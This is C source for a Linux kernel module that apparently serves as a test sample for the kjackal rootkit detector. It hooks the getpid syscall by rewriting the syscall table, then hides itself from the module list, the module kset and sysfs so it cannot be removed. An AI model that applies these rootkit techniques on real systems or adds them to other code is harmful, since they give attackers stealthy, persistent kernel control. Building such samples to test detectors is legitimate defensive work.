/*
 * getpid-hijack.c
 *
 * This module is basically undetectable by kjackal except the syscall table
 * hijack is noticable but the module can not be traced back.
 *
 * Development is ongoing to try to bypass the three method used to hide the
 * module.
 * 
 *  1) Delete from kernel modules list
 *  2) Delete from kernel module_kset
 *  3) Removed from sysfs
 *
 * WARNING: When loading this module, you'll simply *NOT* be able to remove it.
 * If you find a way to do so, *please* contribute to kjackal :).
 *
 * Copyright (C) 2012 - David Goulet <dgoulet@ev0ke.net>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation; only version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 59 Temple
 * Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <asm/trampoline.h>
#include <asm/unistd.h>
#include <linux/syscalls.h>
#include <linux/vmalloc.h>
#include <linux/kallsyms.h>

void **sys_call_table;
struct kset *mod_kset_sym;
void (*remove_dir_sym)(struct kobject *k);

asmlinkage int (*orig_getpid)(void);

asmlinkage int hook_getpid(void)
{
	printk("jacked! 4\n");
	return orig_getpid();
}

void hook_syscalls(void)
{
	orig_getpid = sys_call_table[__NR_getpid];

	sys_call_table[__NR_getpid] = hook_getpid;
}

void *get_writable_sct(void *sct_addr)
{
	struct page *p[2];
	void *sct;
	unsigned long addr = (unsigned long)sct_addr & PAGE_MASK;

	if (sct_addr == NULL)
		return NULL;

	p[0] = virt_to_page(addr);
	p[1] = virt_to_page(addr + PAGE_SIZE);

	sct = vmap(p, 2, VM_MAP, PAGE_KERNEL);
	if (sct == NULL)
		return NULL;
	return sct + offset_in_page(sct_addr);
}

int init_module(void)
{
	int end = 0;
	struct kobject *k;
	const char *name;

	/*
	 * The SYS_CALL_TABLE string below is replaced by the Makefile with the
	 * correct address taken from /boot/Systemp.map-$(uname -r).
	 */
	sys_call_table = get_writable_sct((void *)0xSYS_CALL_TABLE);

	hook_syscalls();

	printk("Simple mod: orig %p new addr %p\n", orig_getpid, hook_getpid);

	/* Hide the module and prevent it from being removed */
	list_del(&THIS_MODULE->list);

	mod_kset_sym = (void *) kallsyms_lookup_name("module_kset");
	if (mod_kset_sym == NULL) {
		return 1;
	}

	spin_lock(&mod_kset_sym->list_lock);

	list_for_each_entry(k, &mod_kset_sym->list, entry) {
		name = kobject_name(k);
		if (!name) {
			if (end) {
				break;
			}
			end++;
			continue;
		}

		if (strcmp(name, "getpid_hijack") == 0) {
			list_del(&k->entry);
			break;
		}
	}

	spin_unlock(&mod_kset_sym->list_lock);

	remove_dir_sym = (void *) kallsyms_lookup_name("sysfs_remove_dir");

	remove_dir_sym(k);

	/*
	 * At this point, the module can be reloaded as much as you want. The
	 * kernel just lost track of it...
	 */

	return 0;
}

void cleanup_module(void)
{
	sys_call_table[__NR_getpid] = orig_getpid;
}

MODULE_LICENSE("GPL");
